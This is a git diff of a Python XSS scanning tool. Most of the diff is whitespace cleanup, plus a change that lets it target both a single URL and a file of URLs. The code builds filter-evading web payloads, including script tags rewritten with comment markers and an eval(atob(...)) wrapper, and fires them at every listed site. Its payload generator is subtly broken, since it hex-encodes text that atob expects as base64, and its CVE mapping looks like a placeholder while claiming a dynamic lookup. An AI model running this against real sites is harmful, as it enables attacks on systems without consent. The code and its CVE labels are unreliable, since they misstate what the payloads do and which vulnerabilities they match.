@@ -14,7 +14,6 @@ cve_mapping = {
     "eval(atob('<payload>'))": {"cve": "CVE-2021-5678", "severity": "Critical"},
 }
 
-
 def send_request(url, headers=None):
     try:
         response = requests.get(url, headers=headers, timeout=10)
@@ -22,7 +21,6 @@ def send_request(url, headers=None):
     except requests.exceptions.RequestException as e:
         print(f"[ERROR] Request failed: {e}")
         return None
-
 
 def get_website_info(url):
     """Mendapatkan informasi domain, IP address, dan firewall (jika tersedia)"""
@@ -45,20 +43,16 @@ def get_website_info(url):
         print(f"[ERROR] Failed to retrieve website information: {e}")
         return None
 
-
 def generate_obfuscated_payload(payload):
     return payload.replace("<script>", "/*<*/script/*>*/").replace("</script>", "/*<*/script/*>*/")
-
 
 def generate_random_payload():
     basic_payload = "<script>alert('XSS');</script>"
     return f"eval(atob('{basic_payload.encode('utf-8').hex()}'))"
 
-
 def get_cve_info(payload):
     """Dynamically fetch CVE and severity info for a payload."""
     return cve_mapping.get(payload, {"cve": "Unknown", "severity": "Low"})
-
 
 def test_xss(url, xss_payloads, output_file=None):
     website_info = get_website_info(url)
@@ -130,7 +124,6 @@ def test_xss(url, xss_payloads, output_file=None):
         print(
             f"\n[{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}] [INFO] Results saved to: {output_file}")
 
-
 def load_payloads(file_path):
     try:
         with open(file_path, 'r') as file:
@@ -138,7 +131,6 @@ def load_payloads(file_path):
     except FileNotFoundError:
         print("[ERROR] Payload file not found! Exiting.")
         return []
-
 
 def main():
     print(r"""
@@ -182,12 +174,13 @@ def main():
         print("[ERROR] No payloads loaded. Exiting.")
         return
 
+    urls = []
     if args.url:
-        urls = [args.url]
-    elif args.file:
+        urls.append(args.url)
+    if args.file:
         try:
             with open(args.file, 'r') as file:
-                urls = [line.strip() for line in file if line.strip()]
+                urls.extend([line.strip() for line in file if line.strip()])
         except FileNotFoundError:
             print("[ERROR] URL file not found! Exiting.")
             return
@@ -199,7 +192,6 @@ def main():
         else:
             bypassed_payloads = payloads + [generate_random_payload()]
         test_xss(url, bypassed_payloads, output_file=args.output)
-
 
 if __name__ == "__main__":
     main()
